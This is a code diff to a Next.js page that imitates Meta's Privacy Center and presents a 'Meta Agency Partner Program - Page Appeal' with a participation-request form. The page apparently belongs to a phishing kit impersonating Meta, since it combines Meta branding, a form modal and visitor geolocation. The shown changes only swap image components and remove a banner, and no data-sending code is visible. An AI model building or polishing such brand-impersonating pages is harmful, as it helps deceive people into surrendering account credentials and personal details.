@@ -2,9 +2,7 @@
 import BackgroundImage from '@/assets/images/bg-image.png';
 import MetaAI from '@/assets/images/meta-ai-image.png';
 import MetaImage from '@/assets/images/meta-image.png';
-import OpenGraphImage from '@/assets/images/opengraph-image.jpg';
 import ProfileImage from '@/assets/images/profile-image.png';
-import Thumbnail from '@/components/thumbnail';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
 import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
@@ -17,7 +15,7 @@ import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyin
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import dynamic from 'next/dynamic';
-import type { StaticImageData } from 'next/image';
+import Image, { type StaticImageData } from 'next/image';
 import { useEffect, useRef, useState, type FC } from 'react';
 
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
@@ -166,11 +164,11 @@ const Page: FC = () => {
     }, [geoInfo, translations]);
 
     return (
-            <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
+        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
             <title>Meta Agency Partner Program - Page Appeal</title>
             <div className='flex w-full max-w-[1100px]'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
-                    <Thumbnail src={MetaImage} alt='Meta Logo' width={70} height={14} quality={90} className='h-3.5 w-[70px]' priority />
+                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                     <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                     {menuItems.map((item) => (
                         <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
@@ -180,9 +178,6 @@ const Page: FC = () => {
                     ))}
                 </div>
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
-                    <div className='overflow-hidden rounded-2xl shadow-lg'>
-                        <Thumbnail src={OpenGraphImage} alt='Meta Business Help Center' width={1200} height={630} quality={90} className='w-full h-auto' priority />
-                    </div>
                     <div className='flex items-center gap-2'>
                         <p className='text-2xl font-bold'>{t('Meta Agency Partner Program')}</p>
                     </div>
@@ -196,7 +191,7 @@ const Page: FC = () => {
                         <li>{t('Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.')}</li>
                     </ul>
                     <div className='rounded-[20px] bg-[#D2D2FE]'>
-                        <Thumbnail src={BackgroundImage} alt='Background' width={1100} height={300} quality={85} className='py-10' />
+                        <Image src={BackgroundImage} alt='' className='py-10' />
                         <div className='flex flex-col items-center justify-center gap-5 p-5'>
                             <div className='rounded-[20px] bg-white p-4'>
                                 <p className='text-[15px]'>{t('Participation Request')}</p>
@@ -227,7 +222,7 @@ const Page: FC = () => {
 
                                 return (
                                     <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Thumbnail src={item.image} alt={item.title} width={48} height={48} quality={80} className='h-12 w-12' />}
+                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
                                             <p className='text-[#465a69]'>{t(item.subtitle)}</p>
@@ -246,7 +241,7 @@ const Page: FC = () => {
 
                                 return (
                                     <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Thumbnail src={item.image} alt={item.title} width={48} height={48} quality={80} className='h-12 w-12' />}
+                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
                                             <p className='text-[#465a69]'>{t(item.subtitle)}</p>
@@ -265,7 +260,7 @@ const Page: FC = () => {
 
                                 return (
                                     <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
-                                        {item.image && <Thumbnail src={item.image} alt={item.title} width={48} height={48} quality={80} className='h-12 w-12' />}
+                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
                                             <p className='text-[#465a69]'>{t(item.subtitle)}</p>
